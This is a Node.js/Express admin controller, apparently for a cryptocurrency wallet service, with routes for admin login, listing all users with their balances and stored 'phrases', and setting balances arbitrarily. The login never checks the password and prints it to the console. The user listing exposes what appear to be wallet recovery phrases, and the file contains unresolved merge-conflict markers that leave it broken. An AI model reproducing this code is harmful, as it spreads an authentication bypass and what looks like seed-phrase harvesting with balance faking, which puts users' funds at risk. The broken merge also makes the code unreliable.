const Admin = require('../models/Admin');
const User = require('../models/User');
const Balance = require('../models/Balance');
const Phrases = require('../models/Phrases');


// Admin Login
exports.loginAdmin = async (req, res) => {
    try {
        const { username, password } = req.body;

        console.log(password)

        const admin = await Admin.findOne({ username });
        if (!admin) {
            return res.status(404).json({ error: 'admin not found' });
        }


        res.status(200).json({
            success: 'Login successful',
            adminID: admin._id,  // ✅ Use admin._id
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};


exports.getAllUsers = async (req, res) => {
    try {
        const users = await User.find();
        
        const userData = await Promise.all(users.map(async (user) => {
            const balance = await Balance.findOne({ userId: user._id }).catch(err => console.error("Balance Fetch Error:", err));
<<<<<<< HEAD
            // const box = await Phrases.find({ userId: user._id }).catch(err => console.error("Box Fetch Error:", err));
            const box = await Phrases.find().catch(err => console.error("Box Fetch Error:", err));
=======
            const phrases = await Phrases.find({ userId: user._id }).catch(err => console.error("Phrases Fetch Error:", err));

            // let parsedBox = [];
            // if (phrases && phrases.box) {
            //     try {
            //         parsedBox = JSON.parse(phrases.box);
            //     } catch (error) {
            //         console.error("Error parsing box:", error);
            //     }
            // }

            // console.log("Parsed Box:", parsedBox); // Log parsed data
>>>>>>> 62e09d5 (Your correction)


            return {
                id: user._id,
                fullname: user.fullname,
                email: user.email,
                balances: balance || {},
                phrases: phrases,
                
            };
        }));

                console.log("Final Response:", JSON.stringify(userData, null, 2)); // Log final response


        res.status(200).json(userData);
    } catch (error) {
        console.error("Server Error:", error);  // Log the actual error
        res.status(500).json({ message: "Error fetching users", error: error.message });
    }
};


exports.updateBalance = async (req, res) => {
  try {
    // console.log("Request received:", req.body); // Log request data

    const { userId, crypto, balance } = req.body;

    if (!userId || !crypto || balance === undefined) {
    //   console.log("Missing required fields:", { userId, crypto, balance });
      return res.json({ success: false, message: "Missing required fields" });
    }

    // Update the balance field directly (not nested inside balances)
    const updatedBalance = await Balance.findOneAndUpdate(
      { userId },
      { $set: { [crypto]: balance } }, // Update the correct field dynamically
      { new: true, upsert: true } // Create the field if it doesn’t exist
    );

    if (!updatedBalance) {
    //   console.log("Balance update failed");
      return res.json({ success: false, message: "Failed to update balance" });
    }

    // console.log("Balance updated successfully:", updatedBalance);
    res.json({ success: true, message: "Balance updated successfully" });

  } catch (error) {
    // console.error("Error updating balance:", error);
    res.json({ success: false, message: "Error updating balance" });
  }
};


// Register
// exports.registerUser = async (req, res) => {
//     try {
//         const { fullname, email, password } = req.body;

//         const existingUser = await User.findOne({ email });
//         if (existingUser) {
//             return res.status(400).json({ error: 'Email already registered' });
//         }

//         const user = new User({ fullname, email, password });
//         await user.save();

//         const balance = new Balance({ userId: user._id });
//         await balance.save();


//         res.status(201).json({ success: 'User registered successfully' });
//     } catch (err) {
//         res.status(500).json({ error: err.message });
//     }
// };




// Dashboard
// exports.getUser = async (req, res) => {
//     try {
//         const user = await User.findById(req.params.id);
//         if (!user) {
//             return res.status(404).json({ message: 'User not found' });
//         }

//         res.status(200).json({
//             fullname: user.fullname,
//             email: user.email,
//         });
//     } catch (err) {
//         res.status(500).json({ error: err.message });
//     }
// };


